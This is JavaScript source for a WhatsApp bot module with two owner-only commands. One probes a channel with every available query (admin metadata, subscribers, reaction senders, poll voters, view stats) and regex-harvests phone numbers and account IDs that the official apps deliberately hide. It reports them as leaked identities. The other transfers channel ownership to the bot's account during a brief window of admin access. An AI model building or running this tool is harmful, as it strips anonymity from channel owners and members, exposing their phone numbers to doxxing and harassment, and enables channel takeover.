/**
 * Channel recon & reclaim (owner/dev only).
 *
 * .chan-probe <channel link | @newsletter jid>
 *   Fires every identity-bearing channel query the transport supports and
 *   harvests anything that looks like a phone-number/LID JID from the raw
 *   responses — admin metadata, subscriber lists, reaction senders, poll
 *   voters, view stats. The server decides what it leaks; we just ask
 *   everything and report. Channel owner numbers are hidden BY DESIGN in the
 *   official apps, so this is pure "measure today's leak" tooling.
 *
 * .chan-owner <channel link | jid>
 *   Transfers channel ownership to the BOT'S OWN ACCOUNT (you). Only works
 *   if the bot account currently holds admin on the channel — designed for
 *   the reclaim flow: get re-added as admin for one minute, run this, done.
 */
export function createChannelProbeService(deps) {
    const { normalizeJid, isDevNumber, safeWaReply, log, logError } = deps || {};
    for (const [name, value] of Object.entries({ normalizeJid, isDevNumber, safeWaReply, log, logError })) {
        if (typeof value !== 'function') throw new Error(`Channel probe service requires ${name}()`);
    }

    const LINK_RE = /whatsapp\.com\/channel\/([A-Za-z0-9_-]+)/;

    function harvestIdentities(obj, sink, source) {
        try {
            const raw = JSON.stringify(obj) || '';
            for (const m of raw.matchAll(/"(\d{7,15})@s\.whatsapp\.net"/g)) {
                const jid = `${m[1]}@s.whatsapp.net`;
                if (!sink.some(e => e.jid === jid)) sink.push({ jid, kind: 'phone', source });
            }
            for (const m of raw.matchAll(/"(\d{5,20})@lid"/g)) {
                const jid = `${m[1]}@lid`;
                if (!sink.some(e => e.jid === jid)) sink.push({ jid, kind: 'lid', source });
            }
        } catch (_) {}
    }

    function serverIds(obj) {
        const ids = new Set();
        try {
            const raw = JSON.stringify(obj) || '';
            for (const m of raw.matchAll(/"(?:message_server_id|server_id)"\s*:\s*"?(\d{3,})"?/g)) ids.add(m[1]);
        } catch (_) {}
        return [...ids].slice(0, 8);
    }

    async function resolveChannel({ sock, arg, message, remoteJid }) {
        if (!arg) {
            await safeWaReply(sock, remoteJid,
                '📡 *CHANNEL PROBE*\n\n' +
                'Usage:\n.chan-probe <channel invite link>\n.chan-probe <channel jid>\n\n' +
                'Dumps every identity the server will leak about a channel — admins, subscribers, reaction senders, poll voters.', message);
            return null;
        }
        const link = arg.match(LINK_RE);
        if (typeof sock.newsletterMetadata !== 'function') {
            await safeWaReply(sock, remoteJid, '❌ This transport has no channel query support.', message);
            return null;
        }
        try {
            if (link) return await sock.newsletterMetadata('invite', link[1]);
            if (arg.includes('@newsletter')) return await sock.newsletterMetadata('jid', arg);
            await safeWaReply(sock, remoteJid, '❌ Give a channel invite link (whatsapp.com/channel/…) or a …@newsletter JID.', message);
        } catch (err) {
            await safeWaReply(sock, remoteJid, `❌ Channel lookup failed: ${err?.message || err}`, message);
        }
        return null;
    }

    async function handle(context) {
        const { sock, message, phoneNumber, remoteJid, fromMe, words, firstWord, prefix } = context;
        const isProbe = firstWord === '.chan-probe' || firstWord === `${prefix}chan-probe`;
        const isOwner = firstWord === '.chan-owner' || firstWord === `${prefix}chan-owner`;
        if (!isProbe && !isOwner) return false;

        const senderJid = message.key?.participant || message.key?.remoteJid || '';
        const ownerOk = fromMe || (!!sock.user?.id && normalizeJid(senderJid) === normalizeJid(sock.user.id));
        if (!ownerOk && !isDevNumber(senderJid)) {
            await safeWaReply(sock, remoteJid, '❌ Owner/dev only.', message);
            return true;
        }
        const arg = (words[1] || '').trim();

        // ── .chan-owner — reclaim: transfer ownership to the bot's own account ──
        if (isOwner) {
            const meta = await resolveChannel({ sock, arg, message, remoteJid });
            if (!meta?.id) return true;
            if (typeof sock.newsletterChangeOwner !== 'function') {
                await safeWaReply(sock, remoteJid, '❌ This transport cannot transfer channel ownership.', message);
                return true;
            }
            const meJid = normalizeJid(String(sock.user?.id || ''));
            try {
                await sock.newsletterChangeOwner(meta.id, meJid);
                log('CHAN', `${phoneNumber}: ownership of ${meta.id} transferred to ${meJid}`);
                await safeWaReply(sock, remoteJid, `👑 *Ownership transferred* — ${meta.id} now belongs to ${meJid}.`, message);
            } catch (err) {
                logError('CHAN', `${phoneNumber}: ownership transfer failed for ${meta.id}`, err);
                await safeWaReply(sock, remoteJid,
                    `❌ Transfer failed: ${err?.message || err}\n\n(The bot account must currently be an ADMIN of the channel — get re-added as admin for one minute, then run this again.)`, message);
            }
            return true;
        }

        // ── .chan-probe — recon ──
        const meta = await resolveChannel({ sock, arg, message, remoteJid });
        if (!meta?.id) return true;
        const jid = meta.id;
        const selfPn = normalizeJid(String(sock.user?.id || ''));
        const identities = [];
        const steps = [];
        const step = async (name, fn) => {
            try {
                const r = await fn();
                harvestIdentities(r, identities, name);
                log('CHAN', `${phoneNumber}: [chan-probe] ${name} → ${JSON.stringify(r).slice(0, 1500)}`);
                steps.push(`✅ ${name}`);
                return r;
            } catch (err) {
                steps.push(`❌ ${name}: ${String(err?.message || err).slice(0, 80)}`);
                return null;
            }
        };

        harvestIdentities(meta, identities, 'metadata');

        const adminMeta = await step('admin metadata (profiles/capabilities)', () =>
            sock.newsletterAdminMetadata(jid, {
                fetchPendingAdmins: true, fetchAdminCount: true, fetchCapabilities: true,
                fetchAdminProfile: true, includeAdminSettings: true
            }));
        await step('admin count', () => sock.newsletterAdminCount(jid));
        const subs = await step('subscribers', () => sock.newsletterSubscribers(jid));

        const msgs = await step('recent messages', () => sock.newsletterFetchMessages(jid, 30));
        const ids = serverIds(msgs);
        for (const sid of ids) {
            await step(`reaction senders (msg ${sid})`, () => sock.newsletterReactionSenders(jid, sid));
            await step(`poll voters (msg ${sid})`, () => sock.newsletterPollVoterList(jid, sid));
            await step(`view stats (msg ${sid})`, () => sock.newsletterViewStats(jid, sid));
        }

        const found = identities.filter(e => e.jid !== selfPn);
        const phones = found.filter(e => e.kind === 'phone');
        const lids = found.filter(e => e.kind === 'lid');
        let report =
            `📡 *CHANNEL PROBE — ${meta.name || jid}*\n\n` +
            `ID: ${jid}\n` +
            `Subscribers: ${meta.subscribersCount ?? meta.subscriberCount ?? '?'}\n` +
            `Verified: ${meta.verification?.verified ? 'yes' : 'no'}\n\n` +
            `── QUERIES ──\n${steps.join('\n')}\n`;
        if (found.length) {
            report += `\n── 🎯 IDENTITIES LEAKED ──\n`;
            if (phones.length) report += phones.map(e => `📞 ${e.jid}  (${e.source})`).join('\n') + '\n';
            if (lids.length) report += lids.slice(0, 20).map(e => `🆔 ${e.jid}  (${e.source})`).join('\n') + '\n';
        } else {
            report += `\nNo identities leaked by the server for this channel.\n`;
        }
        if (subs) report += `\n(Raw responses logged — check console [CHAN] lines.)`;
        await safeWaReply(sock, remoteJid, report, message);
        return true;
    }

    return Object.freeze({ handle });
}
